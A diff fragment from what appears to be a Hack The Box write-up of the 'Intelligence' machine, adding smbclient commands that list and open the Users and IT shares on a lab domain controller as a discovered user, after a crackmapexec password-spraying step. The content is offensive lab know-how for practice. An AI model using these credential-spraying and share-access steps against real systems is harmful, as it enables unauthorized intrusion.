@@ -92,3 +92,18 @@ nano all.txt; ctrl+w password
 crackmapexec smb 10.10.10.248 -u users -p NewIntelligenceCorpUser9876
 ```
 ![image](https://github.com/regarmulia/HTB/assets/33616880/af9cb0b4-8e06-42ea-96e3-366f913af48a)
+
+```
+smbclient -L \\\\10.10.10.248\\ -U intelligence.htb/Tiffany.Molina
+smbclient \\\\10.10.10.248\\Users -U intelligence.htb/Tiffany.Molina
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/3b60eb9f-aaee-4da9-8639-382181585649)
+
+![image](https://github.com/regarmulia/HTB/assets/33616880/972a6c20-fa6e-4693-9782-b904c13b384c)
+
+```
+smbclient \\\\10.10.10.248\\IT -U intelligence.htb/Tiffany.Molina
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/d81005aa-6f13-4698-941d-57d3de9a0095)
+
+![image](https://github.com/regarmulia/HTB/assets/33616880/c6526640-fcd1-4dd6-9486-20c982b8e738)
